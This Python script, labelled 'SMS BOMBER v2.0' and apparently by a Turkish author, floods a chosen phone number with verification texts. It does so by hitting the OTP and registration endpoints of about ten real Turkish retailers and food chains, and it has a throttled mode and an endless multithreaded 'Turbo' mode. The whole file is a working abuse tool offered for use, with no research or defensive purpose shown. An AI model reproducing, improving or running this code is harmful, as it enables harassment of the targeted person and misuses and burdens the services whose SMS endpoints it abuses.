import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style, init
from time import sleep
from os import system
import threading
import sys

init(autoreset=True)  # colorama düzgün çalışsın diye

class SendSms:
    adet = 0

    def __init__(self, phone, mail=""):
        self.phone = str(phone)
        if len(mail) > 0 and "@" in mail:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for _ in range(15)) + "@gmail.com"
        print(f"{Fore.RED + Style.BRIGHT}Scorpion Aktif! Hedef: {Fore.GREEN + Style.BRIGHT}{self.phone}{Style.RESET_ALL}")

    # Tüm API'ler (senin orijinalindeki gibi, hiç dokunmadım)
    def KahveDunyasi(self):
        try:
            r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
                            json={"countryCode": "90", "phoneNumber": self.phone}, timeout=5)
            if r.json().get("processStatus") == "Success":
                self.adet += 1
                print(f"{Fore.GREEN}[+] kahvedunyasi.com → {self.phone}")
        except: pass

    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": self.phone}, timeout=5)
            if r.status_code == 200:
                self.adet += 1
                print(f"{Fore.GREEN}[+] bim.veesk.net → {self.phone}")
        except: pass

    def Evidea(self):
        try:
            url = "https://www.evidea.com/users/register/"
            data = f"--form-data\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--form-data--"
            headers = {"Content-Type": "multipart/form-data; boundary=form-data"}
            r = requests.post(url, data=data, headers=headers, timeout=5)
            if r.status_code == 202:
                self.adet += 1
                print(f"{Fore.GREEN}[+] evidea.com → {self.phone}")
        except: pass

    def Naosstars(self):
        try:
            r = requests.post("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
                            json={"telephone": f"+90{self.phone}", "type": "register"}, timeout=5)
            if r.status_code == 200:
                self.adet += 1
                print(f"{Fore.GREEN}[+] naosstars.com → {self.phone}")
        except: pass

    def Koton(self):
        try:
            r = requests.post("https://www.koton.com/users/register/", data=f"phone=0{self.phone}", timeout=5)
            if r.status_code == 202:
                self.adet += 1
                print(f"{Fore.GREEN}[+] koton.com → {self.phone}")
        except: pass

    def Metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
                            json={"mobilePhoneNumber": self.phone}, timeout=5)
            if r.json().get("status") == "success":
                self.adet += 1
                print(f"{Fore.GREEN}[+] metro-tr.com → {self.phone}")
        except: pass

    def File(self):
        try:
            r = requests.post("https://api.filemarket.com.tr/v1/otp/send",
                            json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=5)
            if r.json().get("responseType") == "SUCCESS":
                self.adet += 1
                print(f"{Fore.GREEN}[+] filemarket.com.tr → {self.phone}")
        except: pass

    def Komagene(self):
        try:
            r = requests.post("https://gateway.komagene.com.tr/auth/auth/smskodugonder",
                            json={"Telefon": self.phone}, timeout=5)
            if r.json().get("Success"):
                self.adet += 1
                print(f"{Fore.GREEN}[+] komagene.com.tr → {self.phone}")
        except: pass

    def Porty(self):
        try:
            r = requests.post("https://panel.porty.tech/api.php", json={"job": "start_login", "phone": self.phone}, timeout=5)
            if r.json().get("status") == "success":
                self.adet += 1
                print(f"{Fore.GREEN}[+] porty.tech → {self.phone}")
        except: pass

    def Dominos(self):
        try:
            r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode",
                            json={"mobilePhone": self.phone, "email": self.mail}, timeout=5)
            if r.json().get("isSuccess"):
                self.adet += 1
                print(f"{Fore.GREEN}[+] dominos.com.tr → {self.phone}")
        except: pass

def banner():
    system("clear" if "linux" in sys.platform else "cls")
    print(f"""
{Fore.RED + Style.BRIGHT}
    ███████╗ ██████╗ ██████╗ ██████╗ ██╗ █████╗  █████╗  █████╗ 
    ██╔════╝██╔═══██╗██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔══██╗
    ███████╗██║   ██║██████╔╝██████╔╝██║███████║╚█████╔╝╚█████╔╝
    ╚════██║██║   ██║██╔══██╗██╔═══╝ ██║██╔══██║██╔══██╗██╔══██╗
    ███████║╚██████╔╝██║  ██║██║     ██║██║  ██║╚█████╔╝╚█████╔╝
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚════╝  ╚════╝ 
{Fore.YELLOW + Style.BRIGHT}                    SMS BOMBER v2.0 - Token Kaldırıldı
{Fore.CYAN}                          Made by Scorpion - 2025
{Style.RESET_ALL}""")

def main():
    banner()
    apis = [attr for attr in dir(SendSms) if callable(getattr(SendSms, attr)) and not attr.startswith("__")]

    while True:
        try:
            secim = int(input(f"""
{Fore.MAGENTA + Style.BRIGHT}╔═══════════════════════════════════════╗
{Fore.CYAN}║  {Fore.WHITE}1{Fore.CYAN} → Normal Mod (Kontrollü Gönderim)    {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}2{Fore.CYAN} → Turbo Mod  (Maksimum Hız)          {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}3{Fore.CYAN} → Çıkış                               {Fore.CYAN}║
{Fore.MAGENTA}╚═══════════════════════════════════════╝
{Fore.YELLOW}Seçiminiz → {Fore.GREEN}"""))
        except:
            print(f"{Fore.RED}Sadece rakam giriniz!{Style.RESET_ALL}")
            sleep(1.5)
            banner()
            continue

        if secim == 3:
            print(f"{Fore.RED}Çıkış yapılıyor...{Style.RESET_ALL}")
            sleep(1)
            break

        # Telefon numarası al
        banner()
        while True:
            tel = input(f"{Fore.YELLOW}Telefon (+90 olmadan): {Fore.GREEN}").strip()
            if len(tel) == 10 and tel.isdigit():
                break
            print(f"{Fore.RED}10 haneli numara giriniz!{Style.RESET_ALL}")

        mail = input(f"{Fore.YELLOW}Mail (boş bırakabilirsin): {Fore.GREEN}").strip()
        sms = SendSms(tel, mail)

        if secim == 1:  # Normal Mod
            try:
                kac = int(input(f"{Fore.YELLOW}Kaç SMS göndermek istiyorsun? (boş = sonsuz): {Fore.GREEN}") or "0")
                bekle = int(input(f"{Fore.YELLOW}Saniye aralığı (ör: 3): {Fore.GREEN}") or "3")
            except:
                kac, bekle = 0, 3

            print(f"\n{Fore.CYAN}Gönderim başladı... Çıkmak için CTRL+C\n")
            sleep(2)

            while True:
                if kac and sms.adet >= kac:
                    print(f"{Fore.GREEN}Görev tamamlandı! Toplam {sms.adet} SMS gönderildi.")
                    input(f"{Fore.YELLOW}Menüye dönmek için Enter...")
                    break
                for api in apis:
                    if kac and sms.adet >= kac: break
                    getattr(sms, api)()
                    sleep(bekle)
                print(f"{Fore.RED}Gönderilen: {Fore.YELLOW}{sms.adet}", end="\r")

        elif secim == 2:  # Turbo Mod
            dur = threading.Event()
            def turbo():
                while not dur.is_set():
                    threads = []
                    for api in apis:
                        t = threading.Thread(target=getattr(sms, api), daemon=True)
                        threads.append(t)
                        t.start()
                    for t in threads:
                        t.join(timeout=0.05)

            print(f"\n{Fore.RED + Style.BRIGHT}TURBO MOD AKTİF!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Durdurmak için CTRL+C bas\n")
            sleep(2)

            t = threading.Thread(target=turbo, daemon=True)
            t.start()

            try:
                while True:
                    print(f"{Fore.RED + Style.BRIGHT}Gönderilen SMS: {Fore.WHITE + Style.BRIGHT}{sms.adet}{Style.RESET_ALL}", end="\r")
                    sleep(0.1)
            except KeyboardInterrupt:
                dur.set()
                print(f"\n\n{Fore.GREEN + Style.BRIGHT}Turbo Mod durduruldu! Toplam {sms.adet} SMS gönderildi.{Style.RESET_ALL}")
                input(f"{Fore.YELLOW}Menüye dönmek için Enter...")
        
        banner()

if __name__ == "__main__":
    main()